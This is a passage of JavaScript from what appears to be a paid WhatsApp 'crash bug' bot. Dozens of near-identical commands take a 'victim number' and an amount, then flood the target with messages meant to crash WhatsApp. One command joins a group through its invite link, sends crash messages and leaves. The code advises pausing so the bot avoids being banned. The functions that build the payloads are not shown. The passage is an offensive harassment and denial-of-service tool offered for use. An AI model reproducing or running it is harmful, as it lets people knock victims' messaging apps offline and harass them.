  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "*👾\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break
case "crashxv-system": {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 6283123456788,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 6283123456788,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6283123456789") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "*👾\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break
case "crashxv-sql": {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 6283123456788,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 6283123456788,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6283123456789") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "*👾\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break
case "crashxv-ui": {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 6283123456788,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 6283123456788,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6283123456789") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "*👾\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break
case "crashxv-external": {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 6283123456788,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 6283123456788,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6283123456789") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "*👾\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break

case "crashxv-internal": {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 6283123456788,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 6283123456788,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6283123456789") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "*👾\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break
case "vivo-system": {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 6283123456788,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 6283123456788,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6283123456789") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "*👾\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break
case "vivo-engine": {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 6283123456788,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 6283123456788,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6283123456789") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "*👾\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break
case "vivo-uicrash": {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 6283123456788,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 6283123456788,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6283123456789") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "*👾\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break
case "vivo-ui": {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 6283123456788,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 6283123456788,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6283123456789") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "*👾\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break
case "vivo-external": {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 6283123456788,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 6283123456788,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6283123456789") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "*👾\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break
case "vivo-internal": {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 6283123456788,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 6283123456788,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6283123456789") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "*👾\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break
case "vivo-mybug": {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 6283123456788,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 6283123456788,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6283123456789") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "*👾\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break
case "vivo-bug": {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 6283123456788,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 6283123456788,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6283123456789") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "*👾\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break
case "vivo-id": {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 6283123456788,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 6283123456788,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6283123456789") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "*👾\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break
case "crashxv-bug": {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 6283123456788,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 6283123456788,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6283123456789") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "*👾\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break

case "sys": {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 6283123456788,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 6283123456788,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6283123456789") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "*👾\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break
case "satan-external": {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 6283123456788,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 6283123456788,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6283123456789") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "*👾\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "satan-internal": {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 6283123456788,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 6283123456788,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6283123456789") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "*👾\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "internal-crash": {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 6283123456788,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 6283123456788,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6283123456789") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "*👾\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "crash-myinter": {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 6283123456788,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 6283123456788,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6283123456789") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "*👾\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "ui-grup": {
  
    if (!isPremium) return reply(mess.prem)
    if (!text) {
      return reply("*HOW TO SEND BUG TO GROUP*\n\n" + (prefix + command) + " https://chat.whatsapp.com/xxxx\n\n_*Note:*_ If you want to send a large number of bugs, please type as follows\n\nEx: ." + command + " linkgc amount\n\nExample:\n." + command + " https://chat.whatsapp.com/xxxx 10");
    }
    reply("please wait, " + command + " bug is in process..");
    if (!text.split(" ")[0].includes("whatsapp.com")) {
      return reply("Link Invalid!");
    }
    let groupLink = text.split(" ")[0].split("https://chat.whatsapp.com/")[1];
    try {
      let bugAmount = text.split(" ")[1] ? text.split(" ")[1] : '1';
      let groupTarget = await deltaxcrash.groupAcceptInvite(groupLink);
      await sleep(2000); // Adjusted sleep time for clarity
      sendViewOnceMessages(groupTarget, bugAmount);
      await sleep(2500); // Adjusted sleep time for clarity
      reply("*DONEâœ… BUG HAS BEEN SENT TO THE GROUP!.*");
      deltaxcrash.groupLeave(groupTarget);
    } catch (error) {
      reply(util.format(error));
    }
  }
  break;
case "internal-ui": {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 6283123456788,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 6283123456788,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6283123456789") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "*👾\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;

case "deltacrsah-layer": {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 6283123456788,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 6283123456788,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6283123456789") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "*👾\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;

case "deltacrsah-engine": {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 6283123456788,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 6283123456788,5`) 
  }
